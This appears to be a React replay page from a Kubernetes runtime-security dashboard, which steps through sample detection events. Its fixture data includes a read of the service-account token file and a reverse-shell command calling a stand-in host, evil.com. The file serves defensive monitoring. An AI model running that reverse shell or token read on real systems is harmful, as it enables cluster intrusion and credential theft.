import { useState } from 'react'
import { motion } from 'framer-motion'

const sampleEvents = [
  {
    ts: '2026-01-10T21:12:33.123Z',
    cluster_id: 'kind-local',
    node_id: 'kind-worker',
    event_type: 'process_exec',
    event_id: 'evt-001',
    process: {
      pid: 12345,
      exe: '/bin/bash',
      cmdline: 'bash -i',
      has_tty: true,
    },
    container: {
      pod: 'vuln-nginx-7c9b',
      namespace: 'prod',
      image: 'nginx:1.25',
    },
  },
  {
    ts: '2026-01-10T21:12:35.456Z',
    cluster_id: 'kind-local',
    node_id: 'kind-worker',
    event_type: 'file_open',
    event_id: 'evt-002',
    process: {
      pid: 12345,
      exe: '/bin/cat',
      cmdline: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
    },
    container: {
      pod: 'vuln-nginx-7c9b',
      namespace: 'prod',
      image: 'nginx:1.25',
    },
  },
  {
    ts: '2026-01-10T21:12:38.789Z',
    cluster_id: 'kind-local',
    node_id: 'kind-worker',
    event_type: 'network_connect',
    event_id: 'evt-003',
    process: {
      pid: 12345,
      exe: '/bin/bash',
      cmdline: 'bash -i >& /dev/tcp/evil.com/4444 0>&1',
    },
    container: {
      pod: 'vuln-nginx-7c9b',
      namespace: 'prod',
      image: 'nginx:1.25',
    },
    network: {
      dst_ip: '203.0.113.50',
      dst_port: 4444,
      proto: 'tcp',
    },
  },
]

export default function ReplayPage() {
  const [events] = useState(sampleEvents)
  const [currentIndex, setCurrentIndex] = useState(0)
  const [playing, setPlaying] = useState(false)

  const currentEvent = events[currentIndex]

  const handlePlay = () => {
    setPlaying(true)
    const interval = setInterval(() => {
      setCurrentIndex((prev) => {
        if (prev >= events.length - 1) {
          setPlaying(false)
          clearInterval(interval)
          return prev
        }
        return prev + 1
      })
    }, 1500)
  }

  return (
    <div className="space-y-6">
      <div>
        <h2 className="font-display text-2xl font-bold text-white">Replay</h2>
        <p className="text-gray-500">Replay stored events for analysis</p>
      </div>

      {/* Controls */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-midnight-800 rounded-xl p-6 border border-midnight-600"
      >
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setCurrentIndex(0)}
              className="px-3 py-2 bg-midnight-700 rounded hover:bg-midnight-600 transition-colors text-sm"
            >
              First
            </button>
            <button
              onClick={() => setCurrentIndex(Math.max(0, currentIndex - 1))}
              className="px-3 py-2 bg-midnight-700 rounded hover:bg-midnight-600 transition-colors text-sm"
            >
              Prev
            </button>
            <button
              onClick={handlePlay}
              disabled={playing}
              className={`px-6 py-2 rounded-lg font-medium transition-all ${
                playing
                  ? 'bg-severity-medium text-black'
                  : 'bg-cyber-green text-black hover:bg-cyber-green/80'
              }`}
            >
              {playing ? 'Playing...' : 'Play'}
            </button>
            <button
              onClick={() => setCurrentIndex(Math.min(events.length - 1, currentIndex + 1))}
              className="px-3 py-2 bg-midnight-700 rounded hover:bg-midnight-600 transition-colors text-sm"
            >
              Next
            </button>
            <button
              onClick={() => setCurrentIndex(events.length - 1)}
              className="px-3 py-2 bg-midnight-700 rounded hover:bg-midnight-600 transition-colors text-sm"
            >
              Last
            </button>
          </div>
          <div className="text-gray-400">
            Event {currentIndex + 1} of {events.length}
          </div>
        </div>

        {/* Timeline */}
        <div className="relative h-2 bg-midnight-700 rounded-full mb-6">
          <div
            className="absolute h-full bg-cyber-green rounded-full transition-all duration-300"
            style={{ width: `${((currentIndex + 1) / events.length) * 100}%` }}
          />
          {events.map((_, i) => (
            <button
              key={i}
              onClick={() => setCurrentIndex(i)}
              className={`absolute top-1/2 -translate-y-1/2 w-4 h-4 rounded-full border-2 transition-all ${
                i <= currentIndex
                  ? 'bg-cyber-green border-cyber-green'
                  : 'bg-midnight-800 border-midnight-600'
              }`}
              style={{ left: `${(i / (events.length - 1)) * 100}%`, marginLeft: '-8px' }}
            />
          ))}
        </div>
      </motion.div>

      {/* Current Event */}
      <motion.div
        key={currentEvent.event_id}
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="bg-midnight-800 rounded-xl p-6 border border-midnight-600"
      >
        <div className="flex items-center gap-3 mb-4">
          <span
            className={`px-3 py-1 rounded text-sm font-bold uppercase ${
              currentEvent.event_type === 'network_connect'
                ? 'bg-severity-critical text-white'
                : currentEvent.event_type === 'file_open'
                ? 'bg-severity-high text-black'
                : 'bg-severity-medium text-black'
            }`}
          >
            {currentEvent.event_type}
          </span>
          <span className="text-gray-500 font-mono text-sm">{currentEvent.ts}</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Process Info */}
          <div className="bg-midnight-700 rounded-lg p-4">
            <h4 className="text-cyber-green font-medium mb-3">Process</h4>
            <div className="space-y-2 font-mono text-sm">
              <div>
                <span className="text-gray-500">exe: </span>
                <span className="text-white">{currentEvent.process.exe}</span>
              </div>
              <div>
                <span className="text-gray-500">cmdline: </span>
                <span className="text-cyber-orange">{currentEvent.process.cmdline}</span>
              </div>
              <div>
                <span className="text-gray-500">pid: </span>
                <span className="text-white">{currentEvent.process.pid}</span>
              </div>
            </div>
          </div>

          {/* Container Info */}
          <div className="bg-midnight-700 rounded-lg p-4">
            <h4 className="text-cyber-blue font-medium mb-3">Container</h4>
            <div className="space-y-2 font-mono text-sm">
              <div>
                <span className="text-gray-500">pod: </span>
                <span className="text-white">{currentEvent.container.pod}</span>
              </div>
              <div>
                <span className="text-gray-500">namespace: </span>
                <span className="text-white">{currentEvent.container.namespace}</span>
              </div>
              <div>
                <span className="text-gray-500">image: </span>
                <span className="text-white">{currentEvent.container.image}</span>
              </div>
            </div>
          </div>

          {/* Network Info (if present) */}
          {currentEvent.network && (
            <div className="bg-midnight-700 rounded-lg p-4 md:col-span-2">
              <h4 className="text-severity-critical font-medium mb-3">Network Connection</h4>
              <div className="flex items-center gap-4 font-mono text-sm">
                <div>
                  <span className="text-gray-500">destination: </span>
                  <span className="text-severity-critical">
                    {currentEvent.network.dst_ip}:{currentEvent.network.dst_port}
                  </span>
                </div>
                <div>
                  <span className="text-gray-500">proto: </span>
                  <span className="text-white">{currentEvent.network.proto}</span>
                </div>
              </div>
            </div>
          )}
        </div>
      </motion.div>

      {/* Raw JSON */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="bg-midnight-800 rounded-xl p-6 border border-midnight-600"
      >
        <h3 className="font-display text-lg font-semibold text-white mb-4">Raw Event</h3>
        <pre className="bg-midnight-900 rounded-lg p-4 overflow-x-auto text-sm font-mono text-gray-300">
          {JSON.stringify(currentEvent, null, 2)}
        </pre>
      </motion.div>
    </div>
  )
}
